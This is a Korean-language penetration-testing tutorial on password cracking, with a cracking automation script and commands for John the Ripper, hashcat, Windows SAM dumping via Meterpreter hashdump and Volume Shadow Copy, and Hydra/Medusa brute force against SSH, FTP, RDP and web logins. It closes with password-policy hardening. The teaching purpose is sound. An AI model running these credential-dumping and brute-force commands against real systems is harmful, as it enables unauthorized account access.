> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 패스워드 크랙 — 이론과 실전

## 0. 초보자를 위한 개념 이해

### 패스워드 크랙이란?

패스워드 크랙은 해시(hash)로 저장된 패스워드를 원래 평문으로 복원하는 기술입니다. 시스템은 보안을 위해 패스워드를 직접 저장하지 않고 단방향 해시 함수로 변환해 저장하는데, 이 해시값에서 원문을 찾아내는 것이 패스워드 크랙입니다.

**왜 배우는가:**
```
패스워드가 저장되는 방식:

  사용자가 입력: "password123"
                    ↓ 해시 함수 (MD5, SHA-1, bcrypt...)
  DB에 저장:    "482c811da5d5b4bc6d497ffa98491e38"

  크랙 방법:
  딕셔너리 공격  → 단어 목록의 해시를 하나씩 비교
  브루트포스    → 모든 조합 시도 (짧은 패스워드에 효과적)
  레인보우 테이블 → 사전 계산된 해시 데이터베이스 조회

  실제 활용:
  침투 테스트 → 탈취한 /etc/shadow 또는 DB 해시 크랙
  포렌식 조사  → 암호화된 파일/계정 접근
  보안 감사   → 취약한 패스워드 정책 점검
```

### 핵심 개념 정리

```
해시 알고리즘 강도 비교:

알고리즘    | 강도    | 크랙 속도       | 현재 권장
─────────────────────────────────────────────
MD5        | 매우 취약 | 초당 수십억 번  | 사용 금지
SHA-1      | 취약     | 초당 수십억 번  | 사용 금지
SHA-256    | 보통     | 초당 수억 번    | 패스워드엔 부적합
bcrypt     | 강함     | 초당 수천 번    | 권장
Argon2     | 매우 강함 | 초당 수백 번   | 최신 권장

Salt(솔트)란?
  동일 패스워드도 다른 해시가 되도록 추가하는 랜덤 값
  password + "abc123" → 다른 해시
  → 레인보우 테이블 공격 무력화

/etc/shadow 해시 형식:
  $1$  = MD5     $5$  = SHA-256
  $2y$ = bcrypt  $6$  = SHA-512
```

### 필요한 도구 및 환경
- **크래킹 도구**: hashcat(GPU 가속), john(CPU 기반) — 두 도구 모두 중요
- **워드리스트**: rockyou.txt(1400만 개 단어), SecLists 등 공개 목록
- **GPU**: hashcat은 GPU를 사용하면 CPU 대비 수백 배 빠름

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""해시 타입 식별 및 딕셔너리 공격 시뮬레이션 (교육용)."""
import hashlib
import re
from typing import Optional

def identify_hash(hash_str: str) -> str:
    """해시 문자열의 알고리즘 타입 추정."""
    hash_str = hash_str.strip()
    patterns: list[tuple[str, str]] = [
        (r"^\$2[ayb]\$", "bcrypt"),
        (r"^\$6\$", "SHA-512 crypt"),
        (r"^\$5\$", "SHA-256 crypt"),
        (r"^\$1\$", "MD5 crypt"),
        (r"^[a-f0-9]{32}$", "MD5"),
        (r"^[a-f0-9]{40}$", "SHA-1"),
        (r"^[a-f0-9]{64}$", "SHA-256"),
    ]
    for pattern, name in patterns:
        if re.match(pattern, hash_str, re.IGNORECASE):
            return name
    return "알 수 없음"

def dictionary_attack_md5(target_hash: str, wordlist: list[str]) -> Optional[str]:
    """MD5 해시에 대한 딕셔너리 공격 시뮬레이션."""
    target_hash = target_hash.lower()
    for word in wordlist:
        candidate = hashlib.md5(word.encode()).hexdigest()
        if candidate == target_hash:
            return word
    return None

if __name__ == "__main__":
    # 테스트: "password"의 MD5 해시
    test_hash = hashlib.md5(b"password").hexdigest()
    print(f"해시 타입: {identify_hash(test_hash)}")

    common_passwords = ["admin", "123456", "password", "qwerty"]
    result = dictionary_attack_md5(test_hash, common_passwords)
    print(f"크랙 결과: {result}")  # "password" 출력
```

---

## 1. 패스워드 해시 기초

### 해시 함수 특성
- **단방향성**: 해시값에서 원문 복원 불가
- **동일 입력 → 동일 출력**: 같은 비밀번호는 같은 해시
- **눈사태 효과**: 입력 1비트 변경으로 완전히 다른 해시

### 주요 해시 알고리즘
| 알고리즘 | 길이 | 보안성 | 예시 |
|---------|------|--------|------|
| MD5 | 128비트 (32자) | 취약 | 5f4dcc3b5aa765d61d8327deb882cf99 |
| SHA-1 | 160비트 (40자) | 취약 | 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 |
| SHA-256 | 256비트 (64자) | 양호 | 5e884898da28047151d0e56f8dc6292... |
| SHA-512 | 512비트 (128자) | 강함 | - |
| bcrypt | 가변 | 강함 | $2y$10$... |
| PBKDF2 | 가변 | 강함 | 반복 해시 |

### 해시 식별 방법

hashid 도구로 해시 문자열의 알고리즘 유형을 자동으로 식별합니다. MD5, SHA-1, bcrypt 등 다양한 해시 형식을 구분할 수 있습니다.

```bash
# hashid로 해시 타입 식별
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
hashid '$1$abc$xyz...'
hashid '$6$salt$hash...'

# hash-identifier 도구
hash-identifier

# 수동 식별
# $1$ → MD5 crypt
# $5$ → SHA-256 crypt
# $6$ → SHA-512 crypt (Linux 현재 기본값)
# $2y$ 또는 $2b$ → bcrypt
# $apr1$ → Apache MD5
```

### 해시 자동 식별 및 크래킹 자동화 (Python)

```python
#!/usr/bin/env python3
"""
해시 식별 및 크래킹 자동화 도구
- 해시 형식 자동 감지
- John the Ripper / hashcat 자동 호출
- 복수 해시 일괄 처리
사용법: python3 hash_cracker.py -H '<hash>' -w rockyou.txt
        python3 hash_cracker.py -f hashes.txt -w wordlist.txt --tool hashcat
"""
import argparse
import hashlib
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path


# 해시 패턴 → (이름, hashcat 모드, john 형식)
HASH_SIGNATURES: list[tuple[re.Pattern, str, str, str]] = [
    (re.compile(r"^\$6\$[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}$"),
     "SHA-512 crypt", "1800", "sha512crypt"),
    (re.compile(r"^\$5\$[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{43}$"),
     "SHA-256 crypt", "7400", "sha256crypt"),
    (re.compile(r"^\$2[ayb]\$\d{2}\$[./A-Za-z0-9]{53}$"),
     "bcrypt", "3200", "bcrypt"),
    (re.compile(r"^\$1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}$"),
     "MD5 crypt", "500", "md5crypt"),
    (re.compile(r"^\$apr1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}$"),
     "Apache MD5", "1600", "md5crypt-opencl"),
    (re.compile(r"^[0-9a-fA-F]{128}$"),
     "SHA-512", "1700", "raw-sha512"),
    (re.compile(r"^[0-9a-fA-F]{64}$"),
     "SHA-256", "1400", "raw-sha256"),
    (re.compile(r"^[0-9a-fA-F]{40}$"),
     "SHA-1", "100", "raw-sha1"),
    (re.compile(r"^[0-9a-fA-F]{32}$"),
     "MD5", "0", "raw-md5"),
    (re.compile(r"^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$"),
     "NTLM (LM:NTLM)", "1000", "nt"),
    (re.compile(r"^aad3b435b51404eeaad3b435b51404ee:[0-9a-fA-F]{32}$"),
     "NTLM (empty LM)", "1000", "nt"),
]


def identify_hash(hash_str: str) -> tuple[str, str, str]:
    """해시 문자열을 분석하여 (이름, hashcat_mode, john_format) 반환."""
    h = hash_str.strip()
    for pattern, name, hc_mode, john_fmt in HASH_SIGNATURES:
        if pattern.match(h):
            return name, hc_mode, john_fmt
    return "Unknown", "", ""


def verify_hash(plaintext: str, hash_str: str, hash_name: str) -> bool:
    """간단한 로컬 검증 (MD5/SHA-1/SHA-256/SHA-512)."""
    name_lower = hash_name.lower()
    algo_map = {
        "md5": hashlib.md5,
        "sha-1": hashlib.sha1,
        "sha-256": hashlib.sha256,
        "sha-512": hashlib.sha512,
    }
    for key, fn in algo_map.items():
        if key in name_lower:
            return fn(plaintext.encode()).hexdigest().lower() == hash_str.lower()
    return False


def crack_with_john(hash_str: str, john_fmt: str, wordlist: Path) -> str | None:
    """John the Ripper로 단일 해시 크래킹. 성공 시 평문 반환."""
    john_bin = shutil.which("john")
    if not john_bin:
        print("[!] john을 찾을 수 없습니다")
        return None

    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
        tf.write(f"target:{hash_str}\n")
        hash_file = tf.name

    try:
        cmd = [john_bin, f"--wordlist={wordlist}", f"--format={john_fmt}", hash_file]
        print(f"  [*] 실행: {' '.join(cmd)}")
        subprocess.run(cmd, capture_output=True, timeout=300)

        # 결과 조회
        result = subprocess.run(
            [john_bin, "--show", f"--format={john_fmt}", hash_file],
            capture_output=True, text=True, timeout=10,
        )
        for line in result.stdout.splitlines():
            if ":" in line and not line.startswith("0 password"):
                return line.split(":", 1)[1].strip()
    except subprocess.TimeoutExpired:
        print("[!] john 실행 시간 초과")
    finally:
        Path(hash_file).unlink(missing_ok=True)

    return None


def crack_with_hashcat(hash_str: str, hc_mode: str, wordlist: Path) -> str | None:
    """hashcat으로 단일 해시 크래킹. 성공 시 평문 반환."""
    hashcat_bin = shutil.which("hashcat")
    if not hashcat_bin:
        print("[!] hashcat을 찾을 수 없습니다")
        return None

    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
        tf.write(f"{hash_str}\n")
        hash_file = tf.name

    outfile = hash_file + ".cracked"
    try:
        cmd = [
            hashcat_bin, "-m", hc_mode, "-a", "0",
            "--quiet", "--potfile-disable",
            "-o", outfile,
            hash_file, str(wordlist),
        ]
        print(f"  [*] 실행: hashcat -m {hc_mode} ...")
        subprocess.run(cmd, capture_output=True, timeout=600)

        cracked = Path(outfile)
        if cracked.exists():
            content = cracked.read_text().strip()
            if ":" in content:
                return content.split(":", 1)[1]
    except subprocess.TimeoutExpired:
        print("[!] hashcat 실행 시간 초과")
    finally:
        Path(hash_file).unlink(missing_ok=True)
        Path(outfile).unlink(missing_ok=True)

    return None


def process_hashes(hashes: list[str], wordlist: Path, tool: str) -> None:
    for i, h in enumerate(hashes, 1):
        h = h.strip()
        if not h:
            continue
        print(f"\n[{i}/{len(hashes)}] 해시: {h[:60]}{'...' if len(h) > 60 else ''}")
        name, hc_mode, john_fmt = identify_hash(h)
        print(f"  형식 감지: {name}  (hashcat={hc_mode}, john={john_fmt})")

        if name == "Unknown":
            print("  [!] 알 수 없는 형식 — 수동 확인 필요")
            continue

        cracked: str | None = None
        if tool in ("john", "auto") and john_fmt:
            cracked = crack_with_john(h, john_fmt, wordlist)
        if cracked is None and tool in ("hashcat", "auto") and hc_mode:
            cracked = crack_with_hashcat(h, hc_mode, wordlist)

        if cracked:
            print(f"  [+] 크랙 성공: {cracked}")
            if verify_hash(cracked, h, name):
                print(f"  [+] 검증 완료")
        else:
            print(f"  [-] 크랙 실패 (워드리스트로 못 찾음)")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="해시 자동 식별 및 크래킹 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""예시:
  python3 hash_cracker.py -H '5f4dcc3b5aa765d61d8327deb882cf99' -w rockyou.txt
  python3 hash_cracker.py -f hashes.txt -w wordlist.txt --tool hashcat
  python3 hash_cracker.py -H '$6$salt$hash...' -w rockyou.txt --tool john
        """,
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-H", "--hash", help="단일 해시 문자열")
    group.add_argument("-f", "--file", type=Path, help="해시 목록 파일 (한 줄에 하나)")

    parser.add_argument("-w", "--wordlist", type=Path, required=True, help="워드리스트 파일")
    parser.add_argument("--tool", choices=["john", "hashcat", "auto"], default="auto",
                        help="사용할 크래킹 도구 (기본값: auto)")
    args = parser.parse_args()

    if not args.wordlist.exists():
        sys.exit(f"[!] 워드리스트 파일 없음: {args.wordlist}")

    if args.hash:
        hashes = [args.hash]
    else:
        if not args.file.exists():
            sys.exit(f"[!] 해시 파일 없음: {args.file}")
        hashes = args.file.read_text().splitlines()

    print(f"[*] 처리할 해시: {len(hashes)}개  |  워드리스트: {args.wordlist}")
    process_hashes(hashes, args.wordlist, args.tool)


if __name__ == "__main__":
    main()
```

---

## 2. Linux 패스워드 구조

### /etc/shadow 파일 형식
```
username:$id$salt$hash:lastchange:min:max:warn:inactive:expire:reserved

예시:
root:$6$R8Fsra2UhPITBTnR$SttrOIIggOjtCtwag.O4JHnCCMQ8rvsqaCuU2VV1Mlvk...:15285:0:99999:7:::

필드 해석:
- username: root
- $id: $6 = SHA-512 알고리즘
- $salt: R8Fsra2UhPITBTnR (랜덤 솔트)
- $hash: 실제 해시값
- lastchange: 15285 (1970-01-01 기준 일 수)
- min: 0 (비밀번호 최소 유지 기간)
- max: 99999 (비밀번호 만료 기간)
- warn: 7 (만료 7일 전 경고)
```

### 솔트(Salt)의 역할
```
솔트 없을 때:
  password → 5f4dcc3b5aa765d... (항상 동일 → 레인보우 테이블 공격 가능)

솔트 있을 때:
  password + salt_a → 랜덤해 보이는 해시_a
  password + salt_b → 완전히 다른 해시_b
  (같은 비밀번호도 솔트가 다르면 해시가 달라짐 → 레인보우 테이블 무력화)
```

### 직접 해시 생성 및 검증 (C 코드)

C 언어로 해시를 생성하고 검증하는 코드입니다. 시스템 수준에서 해시 함수가 어떻게 동작하는지 이해하는 데 도움이 됩니다.

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>
#include <stdlib.h>

int main(void) {
    char *pHash;
    char *pWord;
    char *pResult;

    pHash = (char*) calloc(20, sizeof(char));
    pWord = (char*) calloc(30, sizeof(char));

    strcpy(pWord, "mypassword");
    strcpy(pHash, "$6$R8Fsra2UhPITBTnR$");  // 솔트 부분만 지정

    pResult = crypt(pWord, pHash);
    printf("%s\n", pResult);

    free(pWord);
    free(pHash);
    return 0;
}
```
```bash
gcc -o hashtest hashtest.c -lcrypt
./hashtest
# 출력된 해시를 /etc/shadow의 해시와 비교하여 검증
```

### Python으로 해시 생성 및 검증

```python
#!/usr/bin/env python3
"""
Linux shadow 호환 해시 생성 및 검증 도구
사용법: python3 shadow_hash.py generate <password> [--algorithm sha512]
        python3 shadow_hash.py verify <password> <shadow_entry>
"""
import argparse
import hashlib
import os
import secrets
import sys


def generate_salt(length: int = 16) -> str:
    """shadow 호환 솔트 문자열 생성 (./A-Za-z0-9)."""
    alphabet = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    return "".join(secrets.choice(alphabet) for _ in range(length))


def make_shadow_hash(password: str, algorithm: str = "sha512", salt: str | None = None) -> str:
    """Linux shadow 파일 호환 해시 생성."""
    algo_map = {"md5": "1", "sha256": "5", "sha512": "6"}
    if algorithm not in algo_map:
        sys.exit(f"[!] 지원하지 않는 알고리즘: {algorithm}")

    import crypt  # Python 3.9 이하에서 사용 가능 (3.13에서 제거됨)
    prefix = algo_map[algorithm]
    salt = salt or generate_salt(16)
    salt_str = f"${prefix}${salt}$"
    return crypt.crypt(password, salt_str)


def verify_shadow_entry(password: str, shadow_hash: str) -> bool:
    """shadow 해시와 평문 비밀번호 일치 여부 확인."""
    import crypt
    return crypt.crypt(password, shadow_hash) == shadow_hash


def main() -> None:
    parser = argparse.ArgumentParser(description="Linux shadow 해시 생성/검증")
    sub = parser.add_subparsers(dest="action")

    gen = sub.add_parser("generate", help="해시 생성")
    gen.add_argument("password", help="해시할 비밀번호")
    gen.add_argument("-a", "--algorithm", choices=["md5", "sha256", "sha512"],
                     default="sha512", help="해시 알고리즘 (기본값: sha512)")
    gen.add_argument("--salt", help="고정 솔트 (미지정 시 랜덤 생성)")

    ver = sub.add_parser("verify", help="해시 검증")
    ver.add_argument("password", help="검증할 평문 비밀번호")
    ver.add_argument("hash", help="shadow 해시 문자열")

    args = parser.parse_args()
    if not args.action:
        parser.print_help()
        return

    try:
        if args.action == "generate":
            h = make_shadow_hash(args.password, args.algorithm, args.salt)
            print(f"해시: {h}")
            print(f"shadow 형식: username:{h}:...")
        else:
            match = verify_shadow_entry(args.password, args.hash)
            print(f"[{'+' if match else '-'}] 비밀번호 {'일치' if match else '불일치'}")
            sys.exit(0 if match else 1)
    except ImportError:
        sys.exit("[!] crypt 모듈 없음 — passlib 사용: pip3 install passlib")
    except Exception as e:
        sys.exit(f"[!] 오류: {e}")


if __name__ == "__main__":
    main()
```

---

## 3. John the Ripper

### 설치 및 기본 사용

John the Ripper 크래킹 명령어입니다. 해시 형식을 자동 탐지하고 기본 워드리스트와 변형 규칙을 적용합니다. `--show`로 이미 크래킹된 결과를 확인하고, `--restore`로 중단된 크래킹을 재개합니다.

```bash
# 패키지 설치
apt-get install john

# 또는 소스 컴파일
wget https://www.openwall.com/john/g/john-1.9.0.tar.gz
tar -xzvf john-1.9.0.tar.gz
cd john-1.9.0/src
make linux-x86-64

cd ../run
ls  # john 실행 파일 확인
```

### 기본 공격 모드

John the Ripper 크래킹 명령어입니다. 해시 형식을 자동 탐지하고 기본 워드리스트와 변형 규칙을 적용합니다. `--show`로 이미 크래킹된 결과를 확인하고, `--restore`로 중단된 크래킹을 재개합니다.

```bash
# 1. 브루트포스 공격 (기본 모드)
./john /etc/shadow

# 2. 사전 공격 (Wordlist)
./john --wordlist=password.lst /etc/shadow
./john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow

# 3. 규칙 기반 공격 (Wordlist + 변형)
./john --wordlist=password.lst --rules /etc/shadow

# 4. 특정 형식 지정
./john --format=md5crypt shadow_md5.txt
./john --format=sha512crypt /etc/shadow
./john --format=NT /etc/shadow  # Windows NTLM

# 5. 결과 확인
./john --show /etc/shadow

# 6. 이미 크랙된 것 제외하고 계속
./john --restore /etc/shadow
```

### 사용자 정의 워드리스트 확장

기존 워드리스트에 변형 패턴을 추가하여 확장합니다. 타겟 특화 단어를 포함시키면 크래킹 성공률이 높아집니다.

```bash
# 워드리스트에 추가
echo "mypassword123" >> /usr/share/wordlists/custom.lst
echo "company2024!" >> /usr/share/wordlists/custom.lst

# unshadow로 passwd + shadow 병합 (필수)
unshadow /etc/passwd /etc/shadow > combined.txt
./john --wordlist=rockyou.txt combined.txt
```

### john.conf 규칙 커스터마이징

John the Ripper는 패스워드 해시 크래킹에 사용하는 오프라인 공격 도구입니다. 사전 파일(`--wordlist`)이나 무차별 대입 방식으로 해시를 원본 패스워드로 복원하며, `unshadow`로 passwd/shadow를 합친 후 사용합니다.

```
# /etc/john/john.conf 에 추가 가능한 규칙 예시
[List.Rules:Custom]
: 			# 원본 단어 그대로
c 			# 첫 글자 대문자
u 			# 전체 대문자
l 			# 전체 소문자
$1 			# 끝에 1 추가
$! 			# 끝에 ! 추가
Az"[0-9]"		# 끝에 숫자 추가
```

---

## 4. Hashcat

### GPU 기반 고속 크래킹

hashcat GPU 기반 패스워드 크래킹 명령어입니다. `-m` 옵션으로 해시 타입(0=MD5, 1000=NTLM, 1800=SHA512crypt 등), `-a` 옵션으로 공격 모드를 지정합니다. 고성능 GPU 사용 시 수초~수분 내 일반적인 패스워드를 크래킹할 수 있습니다.

```bash
# 해시 모드 확인
hashcat --help | grep -i md5
hashcat --help | grep -i sha

# 주요 해시 모드
# 0    = MD5
# 100  = SHA-1
# 1400 = SHA-256
# 1800 = SHA-512 (Linux shadow)
# 1000 = NTLM (Windows)
# 2500 = WPA/WPA2 (Wi-Fi)
# 3200 = bcrypt

# 사전 공격
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1800 -a 0 shadow_hash.txt rockyou.txt

# 브루트포스 공격 (마스크 공격)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a  # 6자리 모든 문자

# 마스크 문자 클래스
# ?l = 소문자 [a-z]
# ?u = 대문자 [A-Z]
# ?d = 숫자 [0-9]
# ?s = 특수문자
# ?a = 전체 (?l+?u+?d+?s)

# 규칙 기반 공격
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 조합 공격 (두 단어 조합)
hashcat -m 0 -a 1 hash.txt words1.txt words2.txt

# GPU 성능 테스트
hashcat -b -m 0
```

---

## 5. Windows 패스워드 크래킹

### SAM 데이터베이스 구조
```
Windows 인증 흐름:
  1. 사용자 입력 → Winlogon
  2. Winlogon → LSA (Local Security Authority)
  3. LSA → SAM (Security Accounts Manager)
  4. SAM: %SystemRoot%\system32\config\sam (실행 중에는 잠김)
  5. 보안 서브시스템이 NTLM 해시로 비교

SAM 파일 위치: C:\Windows\System32\config\SAM
SYSTEM 파일:   C:\Windows\System32\config\SYSTEM
```

### Windows 인증 아키텍처 (상세)
```
Winlogon → LSA → SAM → SRM

1. Winlogon
   - 사용자 로그인을 처리하는 프로세스
   - 자격증명을 LSA로 전달

2. LSA (Local Security Authority)
   - 로컬 로그인 처리
   - 보안 정책 검사
   - SID(Security Identifier) 생성
   - 보안 로그 기록

3. SAM (Security Accounts Manager)
   - 사용자/그룹 계정 정보를 저장하는 데이터베이스
   - 입력 자격증명을 SAM 데이터베이스와 비교하여 인증
   - SAM 파일 위치: %SystemRoot%\system32\config\sam
   - 시스템 실행 중에는 잠금 상태 (직접 접근 불가)

4. SRM (Security Reference Monitor)
   - SID를 객체에 할당
   - SID 기반으로 파일/디렉토리 접근(Access) 제어
   - 감사(Audit) 로그 기록
```

### Windows 인증 프로토콜 — Challenge & Response
```
네트워크 인증 방식: Challenge-Response 프로토콜
(클라이언트가 챌린지에 대한 응답을 네트워크로 전송)

Response 생성 알고리즘:

1. LM (LAN Manager) — 매우 취약, 구버전
   - 비밀번호를 14자로 패딩, 14자 초과 시 잘라냄
   - 모두 대문자로 변환
   - 7자씩 분리하여 DES 암호화
   - 결과: 한글 또는 특수문자 포함 시 문제 발생
   - 취약성: 7자 이하 단위 공격 가능

2. NTLM — DES 암호화 기반, 1세대
   - MD4 해시 사용
   - LM보다 강하지만 여전히 취약
   - Pass-the-Hash 공격에 취약

3. NTLMv2 — Windows XP 이후 기본 방식
   - Challenge-Response 방식
   - 서버 챌린지 + 클라이언트 챌린지 조합
   - 타임스탬프 포함으로 재전송 공격 방어
   - 상대적으로 안전하나 크래킹 가능
```

### Cain & Abel 사용법
```
1. 레인보우 테이블로 크래킹:
   Cracker → LM & NTLM Hashes → Add to List → 크래킹 모드 선택
   Cryptanalysis Attack → NTLM Hashes → Rainbow Table Crack

2. 사전 공격:
   Dictionary Attack → NTLM Hashes → 워드리스트 파일 지정

3. 브루트포스:
   Brute-Force Attack → 문자 집합 선택
```

### Windows SAM 덤프 (관리자 권한 필요)

Metasploit Framework는 취약점 익스플로잇 자동화 플랫폼입니다. `search`로 취약점에 맞는 모듈을 찾고, `use`로 선택 후 `set RHOSTS`, `set PAYLOAD`로 대상과 페이로드를 지정하여 공격을 실행합니다.

```bash
# Metasploit 내 Meterpreter
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

# secretsdump.py (impacket)
python secretsdump.py Administrator:password@192.168.1.100

# fgdump.exe (Windows 내에서 실행)
fgdump.exe

# Volume Shadow Copy 활용 (잠긴 SAM 파일 복사)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\
```

### Ophcrack (레인보우 테이블)

Ophcrack은 레인보우 테이블을 이용한 Windows 비밀번호 크래킹 도구입니다. NTLM 해시를 매우 빠르게 크래킹할 수 있지만 테이블 파일이 대용량입니다.

```bash
# Kali에서 설치
apt-get install ophcrack

# LiveCD 버전으로 오프라인 크래킹 가능
# 1. Ophcrack LiveCD 부팅
# 2. 자동으로 Windows SAM 파일 탐지
# 3. 레인보우 테이블로 LM 해시 자동 크래킹

# 레인보우 테이블 다운로드 (별도)
# tables_vista_free: Vista/7용
# tables_xp_free: XP용 (3.8GB)
```

---

## 6. 사전 파일 (Wordlist) 전략

### 유명 워드리스트

칼리 리눅스에 기본 내장된 워드리스트 파일들입니다. rockyou.txt가 가장 널리 사용되는 사전 파일입니다.

```bash
# Kali Linux 내장
ls /usr/share/wordlists/
# rockyou.txt (14백만개 - 실제 유출된 비밀번호)

# SecLists (최고의 워드리스트 모음)
git clone https://github.com/danielmiessler/SecLists /opt/seclists

# 주요 경로
/opt/seclists/Passwords/
/opt/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
```

### 커스텀 워드리스트 생성

#### CeWL (웹사이트 기반)

CeWL은 대상 웹사이트를 크롤링하여 해당 조직과 관련된 단어들로 맞춤형 워드리스트를 생성합니다.

```bash
# 대상 웹사이트에서 단어 추출
cewl http://target.com -d 3 -m 5 -w custom_wordlist.txt
# -d 3 : 깊이 3레벨까지 크롤링
# -m 5 : 최소 5자 이상
```

#### Crunch (패턴 기반 생성)

Crunch로 특정 패턴과 문자 집합에 기반한 워드리스트를 생성합니다. 비밀번호 정책을 알고 있을 때 효과적입니다.

```bash
# 숫자 4자리 조합 (0000~9999)
crunch 4 4 0123456789 -o pin.txt

# 소문자 6자리
crunch 6 6 abcdefghijklmnopqrstuvwxyz -o lowercase6.txt

# 특정 패턴 (@ = 소문자, , = 대문자, % = 숫자, ^ = 특수문자)
crunch 8 8 -t @@@@%%%% -o pattern.txt  # 소문자4+숫자4

# 조합 방식
crunch 6 8 abc123!@ -o combo.txt
```

---

## 7. WinRTGen (레인보우 테이블 생성)

```
WinRTGen은 직접 레인보우 테이블을 생성하는 도구
(이미 생성된 테이블을 다운받는 것이 효율적)

설정 파라미터:
- Hash: NTLM, LM, MD5 등 선택
- Charset: 문자 집합 (alphanumeric 등)
- Min/Max Length: 비밀번호 길이 범위
- Table Count: 생성할 테이블 수
- Chain Length: 체인 길이 (클수록 시간 단축, 파일 크기 증가)

생성 시간:
- 높은 사양 GPU 필요
- 사전 생성 테이블 활용이 현실적
```

---

## 8. FTP 브루트포스 — white.c 실습 도구

### white.c 컴파일 및 실행

white.c 멀티스레드 패스워드 크래커를 컴파일하고 실행하는 방법입니다. pthread 라이브러리를 링크해야 컴파일됩니다.

```bash
# 소스 컴파일 (pthread 링크 필수)
gcc -o ftpcrack white.c -lpthread

# 실행 시 대상 서버 정보 입력
./ftpcrack
# 서버 IP  : 192.168.203.129  (Windows Server 2008)
# 대상 ID  : tester           (FTP 계정 ID)
```

### 공격 메뉴 구성
```
white> help

번호  설명                           단축키
----  ----------------------------   ------
1     순차 브루트포스 (단일 프로세스)  a. [One Process] Sequence Brute Forcing Attack
2     랜덤 브루트포스 (단일 프로세스)  b. [One Process] Random Brute Forcing Attack
3     사전 공격 (단일 프로세스)        c. [One Process] Dictionary Attack
4     순차 브루트포스 (멀티 스레딩)   d. [Multi Threading] Sequence Brute Forcing Attack
5     프로그램 종료                   e. [Multi Threading] Random Brute Forcing Attack
                                     f. [Multi Threading] Random Brute Forcing Attack + 첫자리 소/대문자 교환

기본 대상 문자열:
  0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
```

### 사전 공격 실행 예시

비밀번호 크래킹 도구를 사전 공격 모드로 실행합니다. 워드리스트의 각 단어를 해시와 비교하여 일치하는 비밀번호를 찾습니다.

```bash
# c 입력 → [One Process] Dictionary Attack 실행
# wordlist.txt 파일의 단어로 순차 공격
white> c

# 멀티 스레딩 공격 (d 입력)
# 다중 스레드로 순차 브루트포스 → 속도 향상
white> d
```

### 환경 구성
```
1. Windows Server 2008 설치 (FTP 서버)
2. IIS FTP 설치 및 계정 생성
   net user /add test1 12345
   net user /add test2 asdf
   net user /add test3 qwer12
3. 방화벽 ICMP 허용 (ping 통신 확인용)
4. CentOS (공격자)에서 white.c 컴파일 후 실행
```

---

## 8-2. 온라인 크래킹 도구

### Hydra (네트워크 서비스 브루트포서)

Hydra는 온라인 패스워드 브루트포스 도구로, SSH·FTP·HTTP·SMB 등 수십 가지 프로토콜을 지원합니다. 사전 파일 또는 무차별 대입으로 로그인 자격증명을 온라인 서비스에 직접 시도하는 방식입니다.

```bash
# SSH 브루트포스
hydra -l root -P rockyou.txt ssh://192.168.1.100

# FTP 브루트포스
hydra -l admin -P rockyou.txt ftp://192.168.1.100

# HTTP 폼 브루트포스
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# RDP 브루트포스
hydra -l Administrator -P rockyou.txt rdp://192.168.1.100

# 멀티 스레드 설정
hydra -l admin -P rockyou.txt -t 16 ssh://192.168.1.100

# 사용자 목록 사용
hydra -L users.txt -P rockyou.txt ssh://192.168.1.100
```

### Medusa

Medusa는 병렬 처리 방식의 온라인 로그인 브루트포스 도구입니다. FTP, SSH, HTTP 등 다양한 프로토콜을 지원합니다.

```bash
# FTP 공격
medusa -h 192.168.1.100 -u admin -P rockyou.txt -M ftp

# SSH 공격
medusa -h 192.168.1.100 -u root -P rockyou.txt -M ssh -t 8

# SMB 공격
medusa -h 192.168.1.100 -u administrator -P rockyou.txt -M smbnt
```

---

## 9. 패스워드 정책 및 보안 강화

### /etc/login.defs 설정 (Linux)
```
PASS_MAX_DAYS   90     # 최대 90일
PASS_MIN_DAYS   1      # 최소 1일 유지
PASS_WARN_AGE   7      # 7일 전 경고
PASS_MIN_LEN    8      # 최소 8자
```

### PAM 설정 (Linux PAM 모듈)

PAM(Pluggable Authentication Modules)으로 Linux 패스워드 정책을 강화합니다. 최소 길이, 복잡도, 계정 잠금 등을 설정할 수 있습니다.

```bash
# /etc/pam.d/common-password
password requisite pam_pwquality.so retry=3 minlen=12 \
    dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1

# 의미:
# retry=3: 3번 재시도
# minlen=12: 최소 12자
# dcredit=-1: 숫자 최소 1개
# ucredit=-1: 대문자 최소 1개
# ocredit=-1: 특수문자 최소 1개
